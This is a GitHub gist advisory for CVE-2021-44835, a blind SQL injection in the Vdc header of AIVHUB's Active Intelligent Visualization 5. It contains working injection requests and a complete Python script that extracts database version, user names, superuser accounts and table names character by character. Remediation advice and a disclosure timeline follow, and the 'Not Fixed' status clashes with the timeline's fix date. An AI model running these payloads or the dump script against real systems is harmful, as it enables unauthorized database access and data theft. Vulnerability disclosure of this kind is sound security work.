=== Content from gist.github.com_ee811eab_20250114_213806.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Frntcruz23%2F199782fb65b7dc3c4492d168770b71e5)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Frntcruz23%2F199782fb65b7dc3c4492d168770b71e5&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Frntcruz23%2F199782fb65b7dc3c4492d168770b71e5) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Frntcruz23%2F199782fb65b7dc3c4492d168770b71e5&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@rntcruz23](https://avatars.githubusercontent.com/u/32261688?s=64&v=4)](/rntcruz23)

# [rntcruz23](/rntcruz23)/**[CVE-2021-44835-Blind-SQLi.md](/rntcruz23/199782fb65b7dc3c4492d168770b71e5)**

Last active
December 31, 2022 15:38

Show Gist options

* [Download ZIP](/rntcruz23/199782fb65b7dc3c4492d168770b71e5/archive/b55b3ec279c5b90968d39105081dd4d7427e175e.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Frntcruz23%2F199782fb65b7dc3c4492d168770b71e5)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Frntcruz23%2F199782fb65b7dc3c4492d168770b71e5)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/rntcruz23/199782fb65b7dc3c4492d168770b71e5.js&quot;&gt;&lt;/script&gt;
* Save rntcruz23/199782fb65b7dc3c4492d168770b71e5 to your computer and use it in GitHub Desktop.

[Code](/rntcruz23/199782fb65b7dc3c4492d168770b71e5)
[Revisions
4](/rntcruz23/199782fb65b7dc3c4492d168770b71e5/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/rntcruz23/199782fb65b7dc3c4492d168770b71e5.js&quot;&gt;&lt;/script&gt;

Save rntcruz23/199782fb65b7dc3c4492d168770b71e5 to your computer and use it in GitHub Desktop.

[Download ZIP](/rntcruz23/199782fb65b7dc3c4492d168770b71e5/archive/b55b3ec279c5b90968d39105081dd4d7427e175e.zip)

CVE-2021-44835

 [Raw](/rntcruz23/199782fb65b7dc3c4492d168770b71e5/raw/b55b3ec279c5b90968d39105081dd4d7427e175e/CVE-2021-44835-Blind-SQLi.md)

[**CVE-2021-44835-Blind-SQLi.md**](#file-cve-2021-44835-blind-sqli-md)

# CVE-2021-44835

=======================================================================

* Blind SQLi
* Affected Product: Active Intelligent Visualization - 5
* Vendor: AIVHUB LTD
* Severity: High
* Vulnerability Class: SQL Injection
* Status: Not Fixed
* Author(s): Renato Cruz
  =======================================================================

## Summary

The Vdc header is used in a SQL query without being sanitized.
Breaking the header leaks the query being used:

```
SELECT COALESCE(SUM(CASE WHEN notification_type = 'INFORMATIVE' AND readStatus=0 THEN 1 ELSE 0 END),0) || ';' || COALESCE( --- snip --- THEN 1 ELSE 0 END),0) || ';' || COALESCE( --- snip --- THEN 1 ELSE 0 END),0) || ';' || SUM((CASE WHEN --- snip --- THEN COALESCE(c.user_count,0) ELSE 0 END)) AS unreadCount  FROM < Vdc Header >_ai_notification

```

It is possible to understand that the injection point is in the < Vdc > Header > portion. The SELECT part of the query shows what columns and table names the query is expecting, and as the attacker controls the FROM field, it is possible to create a subquery that will return those expected fields in order to create a valid query.

The PoC below can be used to demonstrate that it is possible to build a valid query, by passing the correct fields as explained previously, and that by controlling the values of those fields, it is possible to control the response header notificationCount: 1;0;0

```
(SELECT 'INFORMATIVE' AS notification_type, 0 AS readstatus, ---snip--) AS n LEFT JOIN (SELECT --- snip ---) AS c ON n.id=c.notification

```

From this PoC, the value of readstatus can be abused to perform a blind SQLi, because if it's value is True (1), then the notificationStatus header will have value 0;0;0;0 On the other hand, if the readstatus value is False (0), the notificationStatus header will have value 1;0;0;0

With this payload, the attacker can ask True or False questions to the database, and build a simple script to automate these questions, and dump all information from the database with a blind SQL injection attack.

## Reproduction Steps

To inject the query, send the payload in the Vdc header, as shown in the following request:

```
POST /aiv/rest/dataset/spreviewNew HTTP/1.1
Host: <host>
Pt: *Original Pt Header*
Vdc: *SQL query*
Id: *user id*
Owner_roles: *original Owner_roles header*
Roles: *roles*
Logs_category: *log category*
Dc: *Dc header*
Timezone: *Timezone*
Brtm: *Brtm header*
Username: *user name"
Content-Type: application/json
X-Xsrftoken: *CSRF token*
Token: *User token*
Owner: *Owner*

*original data*

```

To confirm the blind SQLi, query the DB for the first character of *version()* and compare with the letter P (Postgres):

```
POST /aiv/rest/dataset/spreviewNew HTTP/1.1
Host: <host>
Pt: *Original Pt Header*
Vdc: (select 'INFORMATIVE' as notification_type, (substr(version(),1,1)='P')::int as readstatus, version() as sender, '1' as id, 'ALL' as userName) as n LEFT JOIN (select 1 as owner_count, 1 as user_count, '1' as notification) as c on n.id=c.notification -- c
Id: *user id*
Owner_roles: *original Owner_roles header*
Roles: *roles*
Logs_category: *log category*
Dc: *Dc header*
Timezone: *Timezone*
Brtm: *Brtm header*
Username: *user name"
Content-Type: application/json
X-Xsrftoken: *CSRF token*
Token: *User token*
Owner: *Owner*

*original data*

```

This request should return a response with the *notificationCount: 0;0;0;0* header. On the other hand, if the first letter is compared with the letter X, for example:

```
POST /aiv/rest/dataset/spreviewNew HTTP/1.1
Host: <host>
Pt: *Original Pt Header*
Vdc: (select 'INFORMATIVE' as notification_type, (substr(version(),1,1)='X')::int as readstatus, version() as sender, '1' as id, 'ALL' as userName) as n LEFT JOIN (select 1 as owner_count, 1 as user_count, '1' as notification) as c on n.id=c.notification -- c
Id: *user id*
Owner_roles: *original Owner_roles header*
Roles: *roles*
Logs_category: *log category*
Dc: *Dc header*
Timezone: *Timezone*
Brtm: *Brtm header*
Username: *user name"
Content-Type: application/json
X-Xsrftoken: *CSRF token*
Token: *User token*
Owner: *Owner*
Content-Length: 168

*original data*

```

Then the response should have the *notificationCount: 1;0;0;0* header. Using this it is possible to automate this query to dump information from the database.

## Remediation

* Use prepared statements to associate user input to data used in the queries, ensuring the query structure is kept intact.
* Ensure user input is used as additional parameters in the prepared statement function. Do not perform string concatenation.
* Always validate and sanitize input data.
* Escape all user supplied input

## Disclosure Timeline

* 26-10-2021: Vulnerability disclosed to DeltaRM
* 28-10-2021: Acknowlegement from vendor
* 11-12-2021: Fix released by the vendor
* 10-01-2022: Retest performed, vulnerability fixed

 [Raw](/rntcruz23/199782fb65b7dc3c4492d168770b71e5/raw/b55b3ec279c5b90968d39105081dd4d7427e175e/dump_aiv.png)

[**dump\_aiv.png**](#file-dump_aiv-png)

![dump_aiv.png](https://gist.github.com/rntcruz23/199782fb65b7dc3c4492d168770b71e5/raw/b55b3ec279c5b90968d39105081dd4d7427e175e/dump_aiv.png)

 [Raw](/rntcruz23/199782fb65b7dc3c4492d168770b71e5/raw/b55b3ec279c5b90968d39105081dd4d7427e175e/dump_aiv.py)

[**dump\_aiv.py**](#file-dump_aiv-py)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | import requests |
| --- | --- |
|  | import string |
|  |  |
|  | chars = string.ascii\_lowercase + string.digits + string.punctuation + ' ' + '<>' |
|  | host="" # Insert AIV host |
|  |  |
|  | def get\_token(): |
|  | data = {} # Insert authentication data |
|  | r = requests.post("https://" + host + "/aiv/eAuth",json=data) |
|  |  |
|  | return r.json()[0]['token'] |
|  |  |
|  | def execute(function): |
|  | print(f"[\*] Executing {function}") |
|  | endpoint = "/aiv/rest/dataset/spreviewNew" |
|  | token = "" # Insert DeltaRM Token header |
|  | data={} # Insert random data |
|  |  |
|  | sql=f"(select 'INFORMATIVE' as notification\_type, (lower(substr({function}, %d, 1)) = '%c')::int as readstatus, version() as sender, '1' as id, 'ALL' as userName) as n LEFT JOIN (select 1 as owner\_count, 1 as user\_count, '1' as notification) as c on n.id=c.notification -- c" |
|  |  |
|  | i = 1 |
|  | c = 'P' |
|  | while True: |
|  | for c in chars: |
|  | headers = { |
|  | "Pt": "", # Insert original Pt header |
|  | "Vdc": sql%(i,c), |
|  | "Id": "", # Insert original Id header |
|  | "Owner\_roles": "", # Insert original Owner\_roles header |
|  | "Roles": "", # Insert original Rules header |
|  | "Logs\_category": "", # Insert original Logs\_category header |
|  | "Dc": "", # Insert original Dc header |
|  | "Timezone": "", # Insert original Timezone header |
|  | "Brtm": "", # Insert original Brtm header |
|  | "Username": "", # Insert original Username header |
|  | "X-Xsrftoken": "", # Insert CSRF token |
|  | "Token": token, |
|  | "Owner": "" # Insert original Owner header |
|  | } |
|  |  |
|  | r = requests.post("https://"+host+endpoint, headers=headers, json=data) |
|  | if r.content == b'Session Expired': |
|  | print("\t[-] Session Expired, getting new token") |
|  | token = get\_token() |
|  | r = requests.post("https://"+host+endpoint, headers=headers, json=data) |
|  | try: |
|  | if r.headers['notificationCount'][0]=='0': |
|  | print(c, end='', flush=True) |
|  | break |
|  | except: |
|  | continue |
|  | else: |
|  | break |
|  | i += 1 |
|  | print() |
|  |  |
|  | # Dump some DB information |
|  | execute("version()") |
|  | execute("current\_user") |
|  | execute("user") |
|  | execute("session\_user") |
|  | execute("(SELECT usename FROM pg\_user WHERE usesuper IS TRUE LIMIT 1)") |
|  | for i in range(2): |
|  | execute(f"(SELECT usename FROM pg\_user LIMIT 1 OFFSET {i})") |
|  |  |
|  | for i in range(10): |
|  | execute(f"(select table\_name from information\_schema.tables limit 1 offset {i})") |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Frntcruz23%2F199782fb65b7dc3c4492d168770b71e5)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.aivhub.com_33a24230_20250114_213807.html ===


[![Go Request](assets/images/reqdemo.jpg)](https://aivhub.as.me/schedule.php)


